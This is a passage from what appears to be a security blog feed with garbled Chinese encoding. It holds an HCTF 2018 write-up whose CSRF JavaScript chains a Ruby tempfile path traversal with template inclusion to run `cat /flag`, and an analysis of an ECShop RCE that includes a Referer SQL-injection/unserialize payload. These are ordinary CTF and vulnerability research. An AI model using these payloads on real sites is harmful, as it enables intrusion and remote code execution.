share.path.split('/</span><span class="string">')[-1]+"."+ext</span></div><div class="line"><span class="string">      tmp.context = params[:file][:context]</span></div><div class="line"><span class="string">      tmp.save</span></div><div class="line"><span class="string">    end</span></div><div class="line"><span class="string">    redirect_to root_path</span></div><div class="line"><span class="string">  end</span></div><div class="line"><span class="string"></span></div><div class="line"><span class="string"># post /file/Alpha_test</span></div><div class="line"><span class="string">  def Alpha_test</span></div><div class="line"><span class="string">    if(params[:fid] != "" &amp;&amp; params[:uid] != "" &amp;&amp; params[:fid] != nil &amp;&amp; params[:uid] != nil)</span></div><div class="line"><span class="string">      fid = params[:fid].to_i</span></div><div class="line"><span class="string">      uid = params[:uid].to_i</span></div><div class="line"><span class="string">      if(fid &gt; 0 &amp;&amp; uid &gt; 0)</span></div><div class="line"><span class="string">        if(Sharelist.find_by(sharefile_id: fid)==nil)</span></div><div class="line"><span class="string">          if(Sharelist.count("user_id = ?", uid.to_s) &lt;5)</span></div><div class="line"><span class="string">            share = Sharelist.new</span></div><div class="line"><span class="string">            share.sharefile_id = fid</span></div><div class="line"><span class="string">            share.user_id = uid</span></div><div class="line"><span class="string">            share.save</span></div><div class="line"><span class="string">          end</span></div><div class="line"><span class="string">        end</span></div><div class="line"><span class="string">      end</span></div><div class="line"><span class="string">    end</span></div><div class="line"><span class="string">    redirect_to(root_path)</span></div><div class="line"><span class="string">  end</span></div><div class="line"><span class="string"></span></div><div class="line"><span class="string">  def share_file_to_all</span></div><div class="line"><span class="string">    file = Sharefile.find(params[:fid])</span></div><div class="line"><span class="string">    File.rename(file.path,Rails.root+"/public/download/"+file.name)</span></div><div class="line"><span class="string">    file.public = true</span></div><div class="line"><span class="string">    file.path = Rails.root+"/public/download/"+file.name</span></div><div class="line"><span class="string">    file.save</span></div><div class="line"><span class="string">  end</span></div><div class="line"><span class="string"></span></div><div class="line"><span class="string">end</span></div></pre></td></tr></table></figure>
<p>åˆ†æä¸€ä¸‹è¿™æ®µä»£ç ï¼Œ<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">before_action :authenticate_user!</div><div class="line">before_action :authenticate_role</div><div class="line">before_action :authenticate_admin</div></pre></td></tr></table></figure></p>
<p>é¦–å…ˆä¸‰ä¸ªæ¥å£éƒ½æ˜¯ç®¡ç†å‘˜æ‰èƒ½è°ƒç”¨</p>
<p>ç¬¬ä¸€ä¸ªæ¥å£/file/upload èƒ½å¤Ÿä¸Šä¼ æ–‡ä»¶<br>ç¬¬äºŒä¸ªæ¥å£/file/Alpha_test èƒ½å¤Ÿåˆ†é…ä¸€ä¸ªæ–‡ä»¶ç»™ä¸€ä¸ªç”¨æˆ·<br>ç¬¬ä¸‰ä¸ªæ˜¯æŠŠæ–‡ä»¶å…¬å¼€ï¼Œä½†æ˜¯æ²¡æœ‰æä¾›å¤–éƒ¨è°ƒç”¨è·¯ç”±</p>
<p>åé¢ hint1ç»™äº†æ–‡ä»¶ç»“æ„<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div></pre></td><td class="code"><pre><div class="line">views</div><div class="line">|-- devise</div><div class="line">|   |-- confirmations</div><div class="line">|   |-- mailer</div><div class="line">|   |-- passwords</div><div class="line">|   |-- registrations</div><div class="line">|   |   `-- new.html.erb</div><div class="line">|   |-- sessions</div><div class="line">|   |   `-- new.html.erb</div><div class="line">|   |-- shared</div><div class="line">|   `-- unlocks</div><div class="line">|-- file</div><div class="line">|-- home</div><div class="line">|   |-- Alphatest.erb</div><div class="line">|   |-- addtest.erb</div><div class="line">|   |-- home.erb</div><div class="line">|   |-- index.html.erb</div><div class="line">|   |-- publiclist.erb</div><div class="line">|   |-- share.erb</div><div class="line">|   `-- upload.erb</div><div class="line">|-- layouts</div><div class="line">|   |-- application.html.erb</div><div class="line">|   |-- mailer.html.erb</div><div class="line">|   `-- mailer.text.erb</div><div class="line">`-- recommend</div><div class="line">     `-- show.erb</div></pre></td></tr></table></figure></p>
<p>hint2ç»™äº†ä¸€ä¸ªä¸»é¡µçš„ä»£ç <br><code>&lt;%= render template: &quot;home/&quot;+params[:page] %&gt;</code><br>å‚è€ƒ<a href="http://blog.neargle.com/SecNewsBak/drops/Ruby%20on%20Rails%20%E5%8A%A8%E6%80%81%E6%B8%B2%E6%9F%93%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%20%28CVE.html" target="_blank" rel="noopener">è¿™ç¯‡æ–‡ç« </a><br>å°è¯•è·¨ç›®å½•åŒ…å«æ–‡ä»¶å¤±è´¥ï¼Œåº”è¯¥æ˜¯åªèƒ½åŒ…å«homeç›®å½•ä¸‹çš„æ–‡ä»¶</p>
<p>hint3ç»™äº†rubyç‰ˆæœ¬2.5.0<br>é€šè¿‡æŸ¥æ‰¾rubyç‰ˆæœ¬å·ï¼Œç»“åˆrobotsä»£ç ï¼Œä¸»é¡µä»£ç å’Œç›®å½•ç»“æ„ï¼Œå¯ä»¥ç¡®å®šè¦åˆ©ç”¨çš„æ˜¯è¿™ä¸ªCVEï¼š<br>CVE-2018-6914: Unintentional file and directory creation with directory traversal in tempfile and tmpdir<br>å¤§æ¦‚æ„æ€å°±æ˜¯åœ¨Tempfile åˆ›å»ºæ–‡ä»¶æ—¶å¦‚æœä¼ å…¥(../)å°±èƒ½åˆ›å»ºä»»æ„ç›®å½•æˆ–æ–‡ä»¶<br>æƒ³åˆ°å¯ä»¥ä¼ ä¸ªæ–‡ä»¶åˆ°homeä¸‹ï¼Œç»“åˆä¸»é¡µçš„æ–‡ä»¶åŒ…å«ï¼Œå³å¯RCE</p>
<p>æ•´ä¸ªæ€è·¯å°±å¾ˆæ¸…æ™°äº†ï¼š</p>
<ol>
<li>CSRF è®©adminè°ƒç”¨/file/upload æ¥å£ä¸Šä¼ å¸¦æœ‰æ¶æ„æ–‡ä»¶åçš„æ–‡ä»¶</li>
<li>Tmpfileæ¼æ´ä½¿å¾—æ–‡ä»¶ç”Ÿæˆåœ¨/views/home/ç›®å½•ä¸‹ï¼Œä½†æ˜¯æ–°ç”Ÿæˆçš„æ–‡ä»¶åæœ‰éƒ¨åˆ†æ˜¯éšæœºçš„</li>
<li>CSRF è°ƒç”¨/file/Alpha_test æ¥å£æŠŠæ–‡ä»¶åˆ†é…åˆ°è‡ªå·±çš„idä¸‹ï¼Œåœ¨/Alphatestæ‹¿åˆ°ç”Ÿæˆçš„æ–‡ä»¶å</li>
<li>ä¸»é¡µæ–‡ä»¶åŒ…å«ï¼ŒRCE</li>
</ol>
<p>äºæ˜¯å¼€å§‹äº†è‰°éš¾çš„æ„é€ payload<br>æœ€åä¸Šä¼ çš„payloadå¦‚ä¸‹ï¼š<br><figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span> <span class="attr">charset</span>=<span class="string">"utf-8"</span> <span class="attr">src</span>=<span class="string">"http://code.jquery.com/jquery-1.11.1.min.js"</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></div><div class="line"><span class="undefined">function upload(i) &#123;</span></div><div class="line"><span class="undefined">var test=$('meta').eq(1).attr("content");</span></div><div class="line"><span class="undefined">var url="/file/upload";</span></div><div class="line"><span class="undefined">Â  var data="-----------------------------13025814701038468772945051835\x0d\x0a\</span></div><div class="line"><span class="undefined">Content-Disposition: form-data; name=\"file[myfile]\"; filename=\"Li4vLi4vYXBwL3ZpZXdzL2hvbWUvZGUxdGF4aXNoaXIuZXJic3MuZXJi\"\x0d\x0a\</span></div><div class="line"><span class="undefined">Content-Type: application/text\x0d\x0a\</span></div><div class="line"><span class="undefined">\x0d\x0a\</span></div><div class="line"><span class="undefined">PCU9IGBjYXQgL2ZsYWdgICU+\x0d\x0a\</span></div><div class="line"><span class="undefined">-----------------------------13025814701038468772945051835\x0d\x0a\</span></div><div class="line"><span class="undefined">Content-Disposition: form-data; name=\"file[context]\"\x0d\x0a\</span></div><div class="line"><span class="undefined">\x0d\x0a\</span></div><div class="line"><span class="undefined">de1ta\x0d\x0a\</span></div><div class="line"><span class="undefined">-----------------------------13025814701038468772945051835\x0d\x0a\</span></div><div class="line"><span class="undefined">Content-Disposition: form-data; name=\"authenticity_token\"\x0d\x0a\</span></div><div class="line"><span class="undefined">\x0d\x0a\</span></div><div class="line"><span class="undefined">"+test+"\x0d\x0a\</span></div><div class="line"><span class="undefined">-----------------------------13025814701038468772945051835\x0d\x0a\</span></div><div class="line"><span class="undefined">Content-Disposition: form-data; name=\"commit\"\x0d\x0a\</span></div><div class="line"><span class="undefined">\x0d\x0a\</span></div><div class="line"><span class="undefined">submit\x0d\x0a\</span></div><div class="line"><span class="undefined">-----------------------------13025814701038468772945051835\x0d\x0a\</span></div><div class="line"><span class="undefined">Content-Disposition: form-data; name=\"utf8\"\x0d\x0a\</span></div><div class="line"><span class="undefined">\x0d\x0a\</span></div><div class="line"><span class="undefined">âœ“\x0d\x0a\</span></div><div class="line"><span class="undefined">-----------------------------13025814701038468772945051835--";</span></div><div class="line"><span class="undefined">Â  $.ajax(&#123;</span></div><div class="line"><span class="undefined">Â  Â url: url,</span></div><div class="line"><span class="undefined">Â  Â type:"POST",</span></div><div class="line"><span class="undefined">Â  Â headers: &#123;</span></div><div class="line"><span class="undefined">Â  Â  Â  Â "Content-Type": "multipart/form-data; boundary=---------------------------13025814701038468772945051835",</span></div><div class="line"><span class="undefined">Â  Â  Â  Â "Upgrade-Insecure-Requests":"1"</span></div><div class="line"><span class="undefined">Â  Â &#125;,</span></div><div class="line"><span class="undefined">Â  Â data:data,</span></div><div class="line"><span class="undefined">Â  Â contentType:false,</span></div><div class="line"><span class="undefined">Â  Â success:function(res)&#123;</span></div><div class="line"><span class="undefined">Â  Â &#125;,</span></div><div class="line"><span class="undefined">Â  Â error:function(err)&#123;</span></div><div class="line"><span class="undefined">Â  Â &#125;</span></div><div class="line"><span class="undefined">Â  &#125;)</span></div><div class="line"><span class="undefined">Â &#125;</span></div><div class="line"><span class="undefined">Â for(var i=1;i&lt;2;i++)</span></div><div class="line"><span class="undefined">Â &#123;</span></div><div class="line"><span class="undefined">Â  Â  upload(i);</span></div><div class="line"><span class="undefined">Â &#125;</span></div><div class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></div></pre></td></tr></table></figure></p>
<p>æ–‡ä»¶å†…å®¹ä¸º<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;%= `cat /flag` %&gt;</div></pre></td></tr></table></figure></p>
<p>æ–‡ä»¶åä¸º<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">../../app/views/home/de1taxishir.erbss.erb</div></pre></td></tr></table></figure></p>
<p>æ¨é€æ–‡ä»¶åˆ°æˆ‘çš„uidä¸‹çš„ä»£ç ä¸ºï¼š<br><figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span> <span class="attr">charset</span>=<span class="string">"utf-8"</span> <span class="attr">src</span>=<span class="string">"http://code.jquery.com/jquery-1.11.1.min.js"</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></div><div class="line"><span class="undefined">function go(fffid)&#123;</span></div><div class="line"><span class="undefined">Â  var test=$('meta').eq(1).attr("content");</span></div><div class="line"><span class="undefined">Â  console.log(test);</span></div><div class="line"><span class="undefined">Â  var params = &#123;utf8:"\xE2\x9C\x93",authenticity_token:test,uid:2,fid:fffid,commit:"submit"&#125;;</span></div><div class="line"><span class="undefined">Â  var url = '/file/Alpha_test';</span></div><div class="line"><span class="undefined">$.ajax(&#123;</span></div><div class="line"><span class="undefined">Â  Â url : url,</span></div><div class="line"><span class="undefined">Â  Â type : "POST",</span></div><div class="line"><span class="undefined">Â  Â data : params,</span></div><div class="line"><span class="undefined">Â  Â success : function(result) &#123;</span></div><div class="line"><span class="undefined">Â  Â &#125;,</span></div><div class="line"><span class="undefined">Â  Â error:function(result)&#123;</span></div><div class="line"><span class="undefined">Â  Â &#125;</span></div><div class="line"><span class="undefined">Â &#125;)</span></div><div class="line"><span class="undefined">&#125;</span></div><div class="line"><span class="undefined"></span></div><div class="line"><span class="undefined">for(var i=1;i&lt;20;i+=1)&#123;</span></div><div class="line"><span class="undefined">Â  go(i);</span></div><div class="line"><span class="undefined">&#125;</span></div><div class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></div></pre></td></tr></table></figure></p>
<p>è¿™é‡Œå› ä¸ºä¸çŸ¥é“æ–‡ä»¶idæ˜¯å¤šå°‘ï¼Œåªèƒ½æ ¹æ®å‰é¢çš„filenumberæ¥çˆ†ç ´ä¸€ä¸‹ï¼Œæ‰€ä»¥å†™äº†ä¸ªforå¾ªç¯<br>æœ€åä¸Šä¼ ä¸Šå»å¹¶è·å–æ–‡ä»¶ååï¼Œåœ¨ä¸»é¡µè¿›è¡Œæ–‡ä»¶åŒ…å«æ‰§è¡Œå‘½ä»¤ï¼Œè¯»å–flag</p>
<p><img src="/img/2018-hctf-4.png" alt=""></p>
<p>psï¼šè¿™é“é¢˜æœ‰ä¸ªæ…ğŸ’©bugï¼Œåˆ©ç”¨æ¨æ–‡ä»¶ç»™ç”¨æˆ·æ¥å£ï¼Œæ— é™æš´åŠ›æ¨fidåˆ°è‡ªå·±çš„uidä¸‹ï¼Œå°±èƒ½çœ‹åˆ°åˆ«äººä¸Šä¼ çš„æ–‡ä»¶ï¼Œå¹¶ä¸”åˆ«äººå°±ä¸çŸ¥é“ä»–çš„æ–‡ä»¶åæ˜¯å•¥äº†</p>
<p>è¿˜æœ‰å°±æ˜¯jsæ„é€ ä¸€ä¸ªæ–‡ä»¶ä¸Šä¼ å¤ªå‘äº†ï¼Œä¸€å¼€å§‹ç”¨new Fileï¼Œä¸€ç›´å¤±è´¥ï¼Œåé¢å‘ç°æ˜¯PhantomJSä¸æ”¯æŒè¿™ä¸ªh5çš„ç±»å¥½åƒï¼Œäºæ˜¯ç¡¬ç”Ÿç”Ÿå†™äº†ä¸ªmultipart/form-data å‡ºæ¥</p>
<blockquote>
<p>flag:hctf{8f4c57063ddb7b106e03e25f7d1bb813}</p>
</blockquote>
<h2 id="åè®°"><a href="#åè®°" class="headerlink" title="åè®°"></a>åè®°</h2><p>è¿˜æ˜¯å­¦åˆ°äº†å¾ˆå¤šçŸ¥è¯†ï¼Œå°¤å…¶æ˜¯shareè¿™é“é¢˜ï¼Œæœ€åç»™æ­ç”µçš„å‡ºé¢˜å’Œè¿ç»´å¸ˆå‚…ä»¬é€’èŒ¶ï¼Œç»™é˜Ÿå‹ä»¬é€’èŒ¶ï¼</p>
]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;å‰è¨€&quot;&gt;&lt;a href=&quot;#å‰è¨€&quot; class=&quot;headerlink&quot; title=&quot;å‰è¨€&quot;&gt;&lt;/a&gt;å‰è¨€&lt;/h2&gt;&lt;p&gt;å‘¨æœ«è‚äº†ä¸¤é¢˜HCTFï¼Œæ„Ÿè°¢é˜Ÿå‹ä»¬å¸¦é£ï¼Œè¿™é‡Œè®°å½•ä¸€ä¸‹åšçš„WEBé¢˜&lt;br&gt;é¡ºä¾¿æ‰“ä¸ªå°å¹¿å‘Šï¼šDe1taé•¿æœŸæ‹› é€†å‘/pwn/å¯†ç å­¦/ç¡¬ä»¶/å–è¯/æ‚é¡¹/etc. é€‰æ‰‹ï¼Œæ€¥æ‹›äºŒè¿›åˆ¶å’Œå¯†ç é€‰æ‰‹,æœ‰æ„å‘çš„å¤§ä½¬è¯·è”ç³»ZGUxdGFAcHJvdG9ubWFpbC5jb20=&lt;/p&gt;
    
    </summary>
    
    
      <category term="CTF" scheme="https://www.codemonster.cn/tags/CTF/"/>
    
      <category term="WriteUp" scheme="https://www.codemonster.cn/tags/WriteUp/"/>
    
      <category term="WEB" scheme="https://www.codemonster.cn/tags/WEB/"/>
    
  </entry>
  
  <entry>
    <title>ECShopå‰å°RCEæ¼æ´åˆ†æ</title>
    <link href="https://www.codemonster.cn/2018/09/10/2018-ecshop-rce-analyse/"/>
    <id>https://www.codemonster.cn/2018/09/10/2018-ecshop-rce-analyse/</id>
    <published>2018-09-10T05:11:58.000Z</published>
    <updated>2018-09-10T12:06:49.828Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00å‰è¨€"><a href="#0x00å‰è¨€" class="headerlink" title="0x00å‰è¨€"></a>0x00å‰è¨€</h2><p>å‰å‡ å¤©å‡ºäº†ä¸ª<code>ECShop&lt;= 2.7.x/3.6.x</code>å‰å°RCEï¼Œå®è®­å¤ªæ— èŠäº†æ¥åˆ†æä¸€æ³¢<br><a id="more"></a></p>
<h2 id="0x01ç¯å¢ƒæ­å»º"><a href="#0x01ç¯å¢ƒæ­å»º" class="headerlink" title="0x01ç¯å¢ƒæ­å»º"></a>0x01ç¯å¢ƒæ­å»º</h2><ul>
<li><a href="http://download.ecshop.com/2.7.3/ECShop_V2.7.3_UTF8_release1106.rar" target="_blank" rel="noopener">ECShop_V2.7.3</a></li>
<li>nginx</li>
<li>php</li>
</ul>
<h2 id="0x02æ¼æ´åŸç†"><a href="#0x02æ¼æ´åŸç†" class="headerlink" title="0x02æ¼æ´åŸç†"></a>0x02æ¼æ´åŸç†</h2><p>æ¼æ´çš„è§¦å‘ç‚¹åœ¨/user.php:301ï¼Œå¯ä»¥çœ‹åˆ°ä»£ç é€»è¾‘åšäº†ä¸ªåˆ¤æ–­ï¼Œå¦‚æœhttpå¤´éƒ¨çš„refererä¸åŒ…å«<code>user.php</code>ï¼Œå°±å°†refererèµ‹å€¼ç»™<code>$back_act</code>  </p>
<p><img src="/img/2018-ecshop-rce-1.png" alt="">  </p>
<p>æ¥ä¸‹æ¥ç¬¬325è¡Œä»¥$back_actçš„å€¼ä¸ºå‚æ•°ï¼Œä¼ å…¥<code>assign</code>æ–¹æ³•ï¼Œè¯¥æ–¹æ³•çš„ä½œç”¨æ˜¯æ³¨å†Œå˜é‡ï¼Œå°†å¯æ§å˜é‡ä¼ é€’ç»™æ¨¡æ¿å¯¹è±¡ï¼Œæ¥ç€ä½¿ç”¨displayæ–¹æ³•å°±èƒ½å°†è¿™ä¸ªæ¨¡æ¿æ¸²æŸ“å‡ºæ¥ï¼Œæ¥çœ‹ä¸€ä¸‹<code>display</code>æ–¹æ³•çš„å…·ä½“å®ç°ï¼ˆ/includes/cls_template.php:100)  </p>
<p><img src="/img/2018-ecshop-rce-2.png" alt="">  </p>
<p>å¯ä»¥çœ‹åˆ°ä»£ç è·å–äº†$outï¼Œ$outä¸­æœ‰ä¸€éƒ¨åˆ†ä»£ç å°±æ˜¯å‰é¢assignæ³¨å†Œçš„å˜é‡ï¼ˆè¿™é‡Œçš„æŠ€æœ¯ç»†èŠ‚æˆ‘å°±ä¸è®¨è®ºäº†ï¼Œæœ‰å…´è¶£çš„å¸ˆå‚…å¯ä»¥ç ”ç©¶ç ”ç©¶ï¼‰ï¼Œç„¶åå°†$outä¾æ®<code>$_echash</code>åˆ†å‰²å¹¶ä¸”å¯¹å¥‡æ•°å—æ‰§è¡Œäº†insert_modæ–¹æ³•ï¼Œ<code>$_echash</code>æ˜¯ä»£ç é‡Œå†™æ­»çš„<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">var</span> $_echash        = <span class="string">'554fcae493e564ee0dc75bdf2ebf94ca'</span>;</div></pre></td></tr></table></figure></p>
<p>æ‰€ä»¥è¿™é‡Œçš„$valæ˜¯å¯æ§çš„ï¼Œç»§ç»­å¾€ä¸‹è·Ÿ<code>insert_mod</code>æ–¹æ³•ï¼ˆ/includes/cls_template.php:1155ï¼‰  </p>
<p><img src="/img/2018-ecshop-rce-3.png" alt="">  </p>
<p>è¯¥æ–¹æ³•å®ç°äº†ä¸€ä¸ªåŠ¨æ€å‡½æ•°è°ƒç”¨ï¼Œå°†ä¼ å…¥çš„å­—ç¬¦ä¸²åˆ†å‰²åï¼Œå‰åŠéƒ¨åˆ†æ‹¼æ¥è¿›å‡½æ•°åï¼ŒååŠéƒ¨åˆ†ååºåˆ—åŒ–ä¸ºä¸€ä¸ªå¯¹è±¡å¹¶ä¼ å…¥è¯¥å‡½æ•°ï¼ˆè¿™é‡Œå› ä¸ºå‚æ•°å¯æ§ï¼Œç›´æ¥å°±èƒ½ååºåˆ—åŒ–æ¼æ´äº†ï¼Œä½†æ˜¯ä¸çŸ¥é“ä¸ºå•¥æ²¡æœ‰å¸ˆå‚…æåˆ°ï¼Œå¯èƒ½æ˜¯è¢«RCEæ©ç›–äº†8ï¼‰ï¼Œæ‰€ä»¥æ­¤å¤„æˆ‘ä»¬å°±èƒ½è°ƒç”¨ä¸€ä¸ª<code>insert_</code>å¼€å¤´çš„å‡½æ•°ï¼Œè¿™é‡Œé€šè¿‡ç½‘ä¸Šæµä¼ çš„payloadå¯ä»¥çŸ¥é“æ˜¯è°ƒç”¨äº†ä¸€ä¸ª<code>insert_ads</code>æ–¹æ³•ï¼ˆ/includes/lib_insert.php:136ï¼‰</p>
<p><img src="/img/2018-ecshop-rce-4.png" alt="">  </p>
<p>ä»£ç å°†ä¼ å…¥çš„å¯¹è±¡å–å‡ºnumå’Œidæ‹¼æ¥è¿›sqlè¯­å¥ï¼Œå› ä¸ºå¯¹è±¡æ˜¯å¯æ§çš„ï¼Œæ‰€ä»¥è¿™é‡Œå°±å­˜åœ¨äº†sqlæ³¨å…¥æ¼æ´ï¼Œç»“åˆå‰é¢çš„$outåˆ†å‰²å’Œåˆ†å‰²å–adså‡½æ•°åå’Œååºåˆ—åŒ–å¯ä»¥æ„é€ æ³¨å…¥payloadå¦‚ä¸‹<br><figure class="highlight http"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="attribute">Referer</span>: 554fcae493e564ee0dc75bdf2ebf94caads|a:2:&#123;s:3:"num";s:36:"*/ union select 1,2,3,4,5,6,7,8,9,10";s:2:"id";s:3:"'/*";&#125;</div></pre></td></tr></table></figure></p>
<p>æ‹¼æ¥è¿›å»åçš„sqlé•¿è¿™æ ·<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">SELECT</span> a.ad_id, a.position_id, a.media_type, a.ad_link, a.ad_code, a.ad_name, p.ad_width, p.ad_height, p.position_style, <span class="keyword">RAND</span>() <span class="keyword">AS</span> rnd <span class="keyword">FROM</span> <span class="string">`ecshop273`</span>.<span class="string">`ecs_ad`</span> <span class="keyword">AS</span> a <span class="keyword">LEFT</span> <span class="keyword">JOIN</span> <span class="string">`ecshop273`</span>.<span class="string">`ecs_ad_position`</span> <span class="keyword">AS</span> p <span class="keyword">ON</span> a.position_id = p.position_id <span class="keyword">WHERE</span> enabled = <span class="number">1</span> <span class="keyword">AND</span> start_time &lt;= <span class="string">'1536544160'</span> <span class="keyword">AND</span> end_time &gt;= <span class="string">'1536544160'</span> <span class="keyword">AND</span> a.position_id = <span class="string">''</span><span class="comment">/*' ORDER BY rnd LIMIT */</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>,<span class="number">10</span></div></pre></td></tr></table></figure></p>
<p>æ”¾åˆ°æ•°æ®åº“é‡Œå¯ä»¥æˆåŠŸunion selectå‡ºæ•°æ®  </p>
<p><img src="/img/2018-ecshop-rce-5.png" alt="">  </p>
<p>è¿™æ„å‘³ç€æŸ¥è¯¢å‡ºçš„ç»“æœä¹Ÿæ˜¯æˆ‘ä»¬å¯æ§çš„ï¼Œç»§ç»­å•ƒä»£ç ï¼Œå¯ä»¥çŸ¥é“æŸ¥è¯¢å‡ºæ¥çš„position_idç­‰äºä¼ å…¥å¯¹è±¡çš„idå±æ€§æ—¶ï¼Œ<code>$position_style</code>ä¼šè¢«èµ‹å€¼ä¸ºæŸ¥è¯¢å‡ºçš„<code>position_style</code>å¹¶åŠ å…¥å‰ç¼€<code>str:</code>æ¥ç€ä¼ å…¥fetchæ–¹æ³•ä¸­<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">foreach</span> ($res <span class="keyword">AS</span> $row)</div><div class="line">    &#123;</div><div class="line">        <span class="keyword">if</span> ($row[<span class="string">'position_id'</span>] != $arr[<span class="string">'id'</span>])</div><div class="line">        &#123;</div><div class="line">            <span class="keyword">continue</span>;</div><div class="line">        &#125;</div><div class="line">        $position_style = $row[<span class="string">'position_style'</span>];</div><div class="line">        .</div><div class="line">        .</div><div class="line">        .</div><div class="line"> $val = $GLOBALS[<span class="string">'smarty'</span>]-&gt;fetch($position_style);</div></pre></td></tr></table></figure></p>
<p>è·Ÿè¿›fetchæ–¹æ³•ï¼Œåé¢å°±æ˜¯ä¸€æ¡é•¿é•¿çš„åˆ©ç”¨é“¾äº†ï¼š</p>
<ul>
<li>fetchï¼ˆ/includes/cls_template.php:135ï¼‰ï¼šå–str:åçš„å­—ç¬¦ä¸²ï¼Œ<code>fetch_str</code>å¤„ç†åä¼ å…¥_evalæ‰§è¡Œ</li>
<li>_evalï¼ˆ/includes/cls_template.php:1179ï¼‰ï¼šå°†å‚æ•°æ‹¼æ¥è¿›eval()æ‰§è¡Œ</li>
<li>fetch_strï¼ˆ/includes/cls_template.php:281ï¼‰ï¼šè¿‡æ»¤äº†ä¸€å †å‚æ•°ç„¶åå°†<code>{}</code>å†…çš„å­—ç¬¦ä¸²ä¼ å…¥<code>select</code>ä¸­å¤„ç†ï¼Œè¿”å›å¤„ç†åçš„å­—ç¬¦ä¸²</li>
<li>selectï¼ˆ/includes/cls_template.php:371ï¼‰ï¼šå¦‚æœä¼ å…¥çš„å‚æ•°ä»¥<code>$</code>å¼€å¤´ï¼Œåˆ™å°†å…¶ä¼ å…¥<code>get_val</code>å¹¶å°†ç»“æœæ‹¼æ¥åˆ°<code>&lt;?php echo &#39; . $res . &#39;; ?&gt;</code>è¿”å›</li>
<li>get_valï¼ˆ/includes/cls_template.php:553ï¼‰ï¼šé¿å¼€å…¶ä»–å‡ ä¸ªåˆ¤æ–­ï¼Œç›´æ¥å°†å‚æ•°ä¼ å…¥<code>make_val</code>æ‰§è¡Œå¹¶è¿”å›</li>
<li>make_varï¼ˆ/includes/cls_template.php:663ï¼‰ï¼šå°†å­—ç¬¦ä¸²æ‹¼æ¥è¿›<code>$p = &#39;$this-&gt;_var[\&#39;&#39; . $val . &#39;\&#39;]&#39;;</code>å¹¶è¿”å›</li>
</ul>
